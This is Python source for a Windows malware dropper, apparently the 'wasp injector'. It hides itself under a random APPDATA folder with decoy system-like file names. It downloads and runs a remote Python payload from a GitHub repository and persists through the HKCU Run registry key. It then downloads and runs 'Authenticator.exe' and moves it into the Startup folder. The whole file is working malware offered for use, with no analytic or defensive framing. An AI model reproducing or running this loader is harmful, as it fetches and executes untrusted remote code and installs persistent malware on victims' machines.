from sys import executable
from urllib import request
from os import getenv, system, name, listdir, remove
import winreg
from random import choice
from os.path import isfile
import requests
import os
import time
from sys import executable
from urllib import request
import requests
import shutil
import time

if name != "nt":
    exit()

names = ["Mapper", "Loader", "Gameservices", "Microsoft.stdformat", "adobe", "DMapper", "Prism", "Spoc", "System.Threading.Timer", "UI.Plugin.Ncp", "System.Runtime.Serialization.Xml", "System.Net.Security", "System.Net.Requests", "System.Net.Primitives", "System.IO"]

# wasp injector
#Made by loTus01#0002
#Improved by xKian#3113

def getranddir():
    randomloc = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
    subfolders = listdir(randomloc)
    for _ in range(10):
        subchoice = choice(subfolders)
        global finalfile
        finalfile = randomloc + "\\" + subchoice
        if not isfile(finalfile) and " " not in subchoice:
            return finalfile
    return getenv("TEMP")


def getrandfilename(folder):
    randname = choice(names)
    randname = finalfile.split("\\")[-1]+"."+randname
    for _ in range(10):
        if not isfile(f"{folder}\\{randname}"):
            return f"{randname}"
    return finalfile.split("\\")[-1]+"."+"".join(choice("bcdefghijklmnopqrstuvwxyz") for _ in range(8))


def writefile(file):
    with open(file, mode="w", encoding="utf-8") as f:
        f.write(request.urlopen("https://raw.githubusercontent.com/KiritoIsMid/New-Injector/main/HEHEHE.py").read().decode("utf8"))


def execfilexd(path):
    system(f"start {executable} {path}")


def startup(path):
    spoofedpath = f'"{executable}" "{path}"'
    winnreg = winreg.HKEY_CURRENT_USER
    starttup = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    keyc = winreg.CreateKeyEx(winnreg, starttup, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(keyc, choice(names), 0, winreg.REG_SZ, f"{spoofedpath}")


folder = getranddir()
filename = getrandfilename(folder)
full = folder + "\\" + filename
writefile(full)
execfilexd(full)
try:
    startup(full)
except:
    pass

url = 'https://github.com/KiritoIsMid/New-Injector/blob/main/Authenticator.exe?raw=true'
filename = 'Authenticator.exe'

# Kill any existing processes with the same filename
os.system(f'taskkill /f /im {filename}')

# Download the file from GitHub
response = requests.get(url)
with open(filename, 'wb') as f:
    f.write(response.content)

# Run the file
os.system(filename)

# Wait for the file to finish executing
time.sleep(5)

# Move the file to the startup folder
startup_path = os.path.join(getenv("APPDATA"), "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup")
startup_file = os.path.join(startup_path, filename)

# Wait for a few seconds to make sure the file has finished executing
time.sleep(5)

shutil.move(filename, startup_file)
